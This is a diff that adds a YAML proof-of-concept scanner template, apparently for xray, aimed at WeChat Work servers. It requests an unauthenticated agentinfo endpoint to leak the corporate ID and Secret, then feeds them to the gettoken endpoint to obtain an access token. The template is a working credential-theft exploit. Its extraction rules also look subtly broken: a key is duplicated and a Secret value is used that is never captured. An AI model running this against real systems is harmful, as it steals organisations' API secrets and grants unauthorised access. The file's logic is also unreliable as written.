@@ -1,0 +1,34 @@
+name: poc-yaml-qyweixin-info
+detail:
+  author: fuck
+  links:
+    - https://baidu.com
+  vulnerability:
+    level: critical
+transport: http 
+set:
+  s1: randomInt(1000000,9999999)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /cgi-bin/gateway/agentinfo
+      headers:
+      body:
+      follow_redirects: false
+    expression: response.status == 200 && response.body_string.contains("corpid") &&
+      response.body_string.contains("Secret")
+    output:
+      search: |-
+        '"corpid":\\s*(?P<corpid>\\d+),'.bsubmatch(response.body)
+      corpid: search["corpid"]
+      search: |-
+        '"agentid":\\s*(?P<agentid>\\d+),'.bsubmatch(response.body)
+      agentid: search["agentid"]           
+  r1:
+    request:
+      method: GET
+      path: /cgi-bin/gettoken?corpid={{corpid}}&corpsecret={{Secret}}
+      follow_redirects: false
+    expression: response.status == 200     
+expression: r0() && r1()
